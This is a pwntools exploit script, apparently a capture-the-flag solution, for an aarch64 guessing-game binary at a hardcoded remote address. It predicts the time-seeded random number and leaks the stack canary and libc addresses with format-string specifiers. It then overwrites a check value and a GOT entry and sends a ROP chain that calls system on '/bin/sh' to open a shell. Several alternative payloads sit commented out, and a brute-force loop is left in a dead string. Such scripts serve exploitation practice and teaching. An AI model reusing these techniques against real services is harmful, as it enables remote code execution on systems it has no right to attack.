from pwn import *
from icecream import ic
from ctypes import CDLL

elf = exe = ELF("./chall")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = "aarch64"
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("152.69.210.130", 1337)
    if args.GDB:
        # return remote("localhost", 1337)

        return gdb.debug("qemu-aarch64 -L . -g 1234 ./chall".split(), gdbscript=gdbscript, *a, **kw)
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process("qemu-aarch64 -L . chall".split())
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()
glibc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
glibc.srand(glibc.time(0))
rand_num = glibc.rand() % 10000 + 1

# rand_num = int(input("ENTER: "))

sla("Enter your guess: ", str(rand_num))

sla(b"cast your spell: ", b'%21$p.%23$p.%22$p.%33$p.')
canary = int(ru("."), 16)
elf_leak = int(ru(".").strip(), 16)
# ret_addr = int(ru(".").strip(), 16) - 40
check_addr = int(ru(".").strip(), 16) - 132
admin_libc_leak = int(ru(".").strip(), 16) - 0x274cc

# payload = f"%{0x7f}c%15$hhn".encode()
# payload = payload.ljust(24, b'a')
# payload += p64(check_addr)
# sl(payload)

ovr = elf_leak - 400 - 0x200
 
elf.address = ovr - 0xbd4 

last_bit = hex(ovr)[-4:]
val = int(last_bit, 16)

# payload = f'%16$s%{val-6}c%15$hn'.encode()
payload = f'%18$s%{0xbeef-6}c%17$hn%{0xdead-0xbeef}c%19$hn'.encode()
payload = payload.ljust(40, b'a')
# payload += p64(ret_addr)
payload += p64(check_addr)
payload += p64(elf.got['puts'])
payload += p64(check_addr+2)

sla(b"Input a magic string to cast your spell: ", payload)
libc = ELF("./lib/libc.so.6")

libc.address = u64(re(6).ljust(8, b'\x00')) - libc.sym['puts']
ic(hex(libc.address))
ic(hex(admin_libc_leak))
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
gad1 = libc.address + 0x00000000000d20a4
gad2 = libc.address + 0x000000000003ba80

binsh = libc.address + 0x14d9f8
system = libc.address + 0x46d94
admingad = libc.address + 0x000000000010f28c

# payload = b'a'*128
# payload += p64(canary)
# payload += b'b'*8
# payload += p64(gad1)
# payload += b'c'*24
# payload += p64(binsh)
# payload += p64(system)
# payload += p64(gad2)

payload = b'a'*128
payload += p64(canary)
payload += b'b'*8
payload += p64(gad1)
payload += b'c'*0x58
payload += p64(canary)
payload += b'd'*8
payload += p64(binsh)
payload += p64(system)
payload += p64(gad2)

# payload = b'a'*128
# payload += p64(canary)
# payload += b'b'*8
# payload += p64(admingad)
# payload += b'e'*80
# payload += p64(canary) 
# payload += p64(canary) 
# payload += b'c'*120
# payload += b'd'*8
# payload += p64(binsh)
# payload += p64(0)
# payload += p64(0)
# payload += p64(21)
# payload += p64(22)
# payload += p64(23)
# payload += p64(24)
# payload += p64(system)

sla(b"Give me your name: ", payload)

sl("ls")

'''
while True:
    try:
        io = start()
        low = 0
        high = 10000
        val = 5000
        payload = b''
        for i in range(20, 30):
            payload += f'%{i}$p.'.encode()
        sla(b"Enter your guess: ", str(val).encode())
        for i in range(4):
            resp = rl()
            if resp == b'Too low! The spirits are not pleased!\n':
                low = val
                val = (low+high)//2
                sla(b"Enter your guess: ", str(val).encode())
            elif resp == b'Too high! Beware of the dragon\'s fire!\n':
                high = val
                val = (low+high)//2
                sla(b"Enter your guess: ", str(val).encode())
            else:
                sl(payload)
                io.interactive()
        resp = rl()
        if resp == b"Huzzah! You've guessed correctly!\n":
            sl(payload)
            io.interactive()
        rl()
        io.close()
    except EOFError:
        io.close()'''


io.interactive()